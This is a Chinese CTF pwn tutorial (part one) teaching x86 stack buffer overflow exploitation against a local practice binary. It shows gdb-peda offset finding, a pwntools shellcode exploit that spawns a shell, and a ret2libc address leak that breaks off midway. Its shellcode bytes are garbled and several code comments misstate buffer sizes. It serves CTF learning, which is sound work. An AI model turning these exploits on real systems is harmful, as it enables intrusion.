# 【技术分享】跟我入坑PWN第一章
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[WeaponX](http://bobao.360.cn/member/contribute?uid=2803578480)
预估稿费：300RMB（不服你也来投稿啊！）
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**  
**
**传送门**
* * *
[**【技术分享】跟我入坑PWN第二章** ****](http://bobao.360.cn/learning/detail/3339.html)
**  
**
**0x00 背景**
随着CTF相关事业发展的越来越火很多朋友都想入坑CTF。但是网络上关于pwn的相关资料较少不好找造成了大家学习过程存在中的一些困难。作为bin狗我对我学习pwn的过程中一些姿势进行了总结尽量让大家在学习的过程中少走弯路准备了一系列文章囊括一些知识点包括缓冲区溢出缓冲区溢出的利用方式return
to dl resolve 堆溢出off by one格式化字符串漏洞等。
本文默认大家都对pwn的一些原理有所了解所以不在详细赘述pwn的原理而是讲一下利用方法和使用pwntools快速开发exploit的姿势。  
**本文的测试环境为Ubuntu 14.04 desktop x86-64** ，使用到的程序为gdb、gdb-peda、gcc、python、pwntools、socat、rp++、readelf。所有的应用都在本文末尾可以下载方式或者下载链接。
**0x01 缓冲区溢出简介**
本文不再详细赘述缓冲区溢出的原理简单画一个示意图方便大家理解。
     Stackframe
    +------------------+
    |    parameter     |
    +------------------+
    |   local var1     |  
    void func()
    {
        char name[0x50];//0x100大小的栈空间
        read(0, name, 0x100);//输入0x200大小的数据
        write(1, name, 0x100);
    }
    int main()
    {
        func();
        return 0;
    }
**  
**
**0x02 x86下无任何防护机制**  
编译方式：
    gcc -m32 1.c -o 1 -O0 -fno-stack-protector -z execstack
**m32:** 生成32bit程序需要gcc-multilib(x86机器上编译不用加)  
**O0:** 不进行任何优化
**fno-stack-protector:** 不开启canary栈溢出检测
**z execstack:** 开启栈可执行关闭NX
首先寻找多少字节能溢出切刚好能够覆盖return addr。我们使用gdb-peda提供的pattern_create和pattern_offset。pattern_create是生成一个字符串模板输入后根据EIP来确定覆盖return
addr的长度。
    gdb-peda$ pattern_create 200
    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
然后让程序跑起来输入这串字符串后程序崩溃。
    Stopped reason: SIGSEGV
    0x41416741 in ?? ()
    gdb-peda$ pattern_offset 0x41416741
    1094805313 found at offset: 92
然后确定主机是否开启ASLR。
    ➜ cat /proc/sys/kernel/randomize_va_space
    0
可见主机并没有开启ASLR。也可以使用ldd来看加载动态库时动态库的基址来确定是否开启ASLR。
    ➜ ldd 1                                                                                            
        linux-gate.so.1 =>  (0xf7ffd000)
        libc.so.6 => /lib32/libc.so.6 (0xf7e3a000)
        /lib/ld-linux.so.2 (0x56555000)
再次运行ldd，
    ➜ ldd 1                                                                                           
        linux-gate.so.1 =>  (0xf7ffd000)
        libc.so.6 => /lib32/libc.so.6 (0xf7e3a000)
        /lib/ld-linux.so.2 (0x56555000)
两次libc的基址一样也说明了主机没有开启ASLR。然后我们可以在栈中部署一段shellcode然后让return
addr的内容位shellcode的地址注意这块有个坑。gdb调试的时候栈地址和程序运行时不同所以我们需要开启core
dump或者attach到运行的程序上来看程序运行时的栈地址。通过ulimit -c unlimited来开启core
dump。然后让程序崩溃调试一下core dump来找shellcode的地址。
    from pwn import *
    io = process("./1")
    payload = 'a' * 92
    payload += 'bbbb' # eip
    payload += 'cccc' # shellcode
    io.send(payload)
这里bbbb是eip的位置cccc是shellcode的位置然后运行这个python后程序崩溃我们调试core dump(gdb -c
core)文件找cccc的地址填到eip的位置即可。
    #0  0x62626262 in ?? ()
    gdb-peda$ print $esp
    $1 = (void *) 0xffffd0b0
    gdb-peda$ x/wx 0xffffd0b0
    0xffffd0b0:    0x63636363
所以eip填入的地址应该是0xffffd0b0。我们修改一下exploit文件shellcode从exploit-db上找的():
    from pwn import *
    io = process("./1")
    payload = 'a' * 92
    payload += p32(0xffffd0b0)
    payload += "xebx11x5ex31xc9xb1x32x80"
    payload += "x6cx0exffx01x80xe9x01x75"
    payload += "xf6xebx05xe8xeaxffxffxff"
    payload += "x32xc1x51x69x30x30x74x69"
    payload += "x69x30x63x6ax6fx8axe4x51"
    payload += "x54x8axe2x9axb1x0cxcex81"
    raw_input()
    io.send(payload)
    io.interactive()
运行后成功返回shell，
    ➜ python 1.py 
    [+] Started program './1'
    [*] Switching to interactive mode
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxb0xff^1ɱ2x80lx0exffx80uxff2Qi00tii0cjox8aQTx8a⚱x0c΁,x82x0x00x00x00x00x00x00x00x00x00x00x00x00+7zxbfx0ex00x00x00x00x00x00x00x00x00x00x00x00x00x00x00Px83x0x00x00x00x00xffx00Px83x0x00x00x00x00qx83x0x8bx84x0x00x00x00Txffxa0x84x0x10x85x0`xb1
    $ ls
    1
    1.c
    1.py
    core
然而在通常情况下系统会开启NX和ASLR这样就给我们编写exploit造成了一定的困难。
**0x03 x86开启NX提供libc.so**
编译方式：
    gcc -m32 1.c -o 2 -O0 -fno-stack-protector
用gdb-peda中的pattern_offset找到刚好覆盖ebp的长度是92因为主机开启了ASLR。因为我们有了libc.so这样只需要泄漏任意一个函数地址就可以计算出运行时system的地址有了system的地址后我们还需要/bin/sh的地址。得到这个地址有两种途径：
1\. 调用read写入程序的bss段
2\. 计算libc中/bin/sh的地址
**在1中/bin/sh在写入bss的情况下，**
我们随便选择一个函数read去泄露read的地址因此我们需要算出read和system的偏移。使用gdb调试程序运行起来打印一下read的地址和system的地址即可算出偏移。
    gdb-peda$ print read
    $1 = {} 0xf7ef1880 
    gdb-peda$ print system
    $2 = {} 0xf7e57e70 
计算出read和system的偏移为0x99a10(read_addr – system_addr)有了这个偏移我们还需要得到bss段的地址
    ➜ readelf -a 2 | grep bss
      [25] .bss              NOBITS          0804a024 001024 000004 00  WA  0   0  1
有了bss段的地址后开始构造exploit，
    from pwn import *
    io = process("./2")
    elf = ELF("./2")
    offset = 92
    offset_read_system = 0x99a10
    addr_bss = 0x0804a024
    # leak read address
    payload = offset * 'a'
    payload += p32(elf.plt['write'])
    payload += p32(elf.symbols['func'])# return to func
    payload += p32(1)
    payload += p32(elf.got['read'])
    payload += p32(4)
    io.send(payload)
    io.recv(0x100)
    read_addr = u32(io.recv(4))
    log.success("read address =>{}".format(hex(read_addr)))
    system_addr = read_addr - offset_read_system
    log.success("system address =>{}".format(hex(system_addr)))